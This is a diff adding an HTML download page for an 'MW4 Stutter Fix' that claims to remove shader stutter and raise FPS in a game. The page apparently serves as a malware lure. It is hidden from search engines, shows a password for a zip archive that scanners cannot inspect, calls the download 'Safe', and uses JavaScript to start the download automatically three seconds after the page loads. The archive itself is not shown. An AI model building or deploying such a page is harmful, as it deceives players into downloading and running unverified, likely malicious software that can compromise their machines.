@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MW4 Stutter Fix 2026 — Download</title>
+    <meta name="description" content="Download MW4 Stutter Fix 2026. Fix shader compilation stutter and boost FPS in Modern Warfare 4.">
+    <meta name="robots" content="noindex, nofollow">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050505;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #ef4444; /* Тактический красный */
+            --accent-hover: #dc2626;
+            --glow: rgba(239, 68, 68, 0.2);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(circle at 50% 20%, rgba(239, 68, 68, 0.1), transparent 45%),
+                radial-gradient(circle at 50% 80%, rgba(30, 41, 59, 0.3), transparent 50%);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+        }
+
+        /* Анимация появления */
+        @keyframes zoomIn {
+            0% { opacity: 0; transform: scale(0.9); filter: blur(5px); }
+            100% { opacity: 1; transform: scale(1); filter: blur(0); }
+        }
+
+        /* Главный контейнер - без острых углов */
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            animation: zoomIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        /* Круглая иконка сверху */
+        .icon-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.02));
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            box-shadow: 0 0 30px var(--glow);
+        }
+
+        .icon-circle svg {
+            width: 32px;
+            height: 32px;
+            color: var(--accent);
+        }
+
+        /* Военный шрифт для заголовка */
+        h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 2.8rem;
+            font-weight: 700;
+            line-height: 1.1;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 12px;
+            background: linear-gradient(to bottom, #ffffff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 1.05rem;
+            line-height: 1.6;
+            margin-bottom: 40px;
+            max-width: 480px;
+        }
+
+        /* Круглые капсулы для фич */
+        .pill-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 48px;
+        }
+
+        .pill {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: var(--text-main);
+            font-size: 0.85rem;
+            font-weight: 500;
+            padding: 8px 20px;
+            border-radius: 50px; /* Круглые */
+            backdrop-filter: blur(10px);
+        }
+
+        /* Блок скачивания - мягкий, без углов */
+        .download-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+            width: 100%;
+        }
+
+        /* Кнопка капсула */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: var(--accent);
+            color: white;
+            padding: 16px 40px;
+            border-radius: 50px; /* Круглая */
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 10px 30px -10px var(--accent);
+            width: max-content;
+        }
+
+        .btn:hover {
+            background: var(--accent-hover);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 15px 40px -10px var(--accent);
+        }
+
+        .btn svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        /* Пароль в виде круглой плашки */
+        .password-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 8px 8px 8px 24px;
+            border-radius: 50px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .password-label {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .password-value {
+            background: rgba(255, 255, 255, 0.1);
+            font-family: ui-monospace, monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            user-select: all;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .password-value:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .status {
+            display: none;
+            font-size: 0.9rem;
+            color: #10b981;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer {
+            margin-top: 48px;
+            font-size: 0.75rem;
+            color: #52525b;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        @media (max-width: 500px) {
+            h1 { font-size: 2rem; }
+            .btn { width: 100%; padding: 14px 20px; font-size: 1.1rem; }
+            .password-wrapper { width: 100%; justify-content: space-between; padding-left: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <div class="icon-circle">
+            <!-- Иконка прицела/молнии -->
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="4"></circle><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line></svg>
+        </div>
+        
+        <h1>MW4 Stutter Fix</h1>
+        <p class="subtitle">Eliminate shader compilation stutter, fix frame-time drops, and boost FPS. Safe, external optimization for Modern Warfare 4.</p>
+        
+        <div class="pill-container">
+            <span class="pill">Shader Cache</span>
+            <span class="pill">Frame-Time</span>
+            <span class="pill">FPS Boost</span>
+            <span class="pill">Driver Check</span>
+        </div>
+
+        <div class="download-area">
+            <a href="files/MW4StutterFix.zip" download class="btn" id="downloadBtn">
+                <div class="spinner" id="spinner"></div>
+                <svg id="dlIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+                <span id="btnText">Download</span>
+            </a>
+            
+            <div class="password-wrapper">
+                <span class="password-label">Password</span>
+                <span class="password-value" title="Click to copy">6427910552</span>
+            </div>
+            
+            <div class="status" id="status">Download started automatically.</div>
+        </div>
+    </div>
+    
+    <p class="footer">© 2026 MW4 Stutter Fix · For Offline Use</p>
+
+    <script>
+        const downloadUrl = "files/MW4StutterFix.zip";
+        const fileName = "MW4StutterFix.zip";
+        const btn = document.getElementById('downloadBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const dlIcon = document.getElementById('dlIcon');
+        const status = document.getElementById('status');
+
+        function triggerDownload() {
+            const a = document.createElement('a');
+            a.href = downloadUrl; a.download = fileName;
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+            
+            status.style.display = 'block';
+            btnText.textContent = "Again";
+            spinner.style.display = 'none';
+            dlIcon.style.display = 'block';
+        }
+
+        // Автоскачка через 3 секунды
+        setTimeout(() => { triggerDownload(); }, 3000);
+
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            btnText.textContent = "...";
+            dlIcon.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(() => { triggerDownload(); }, 600);
+        });
+    </script>
+</body>
+</html>
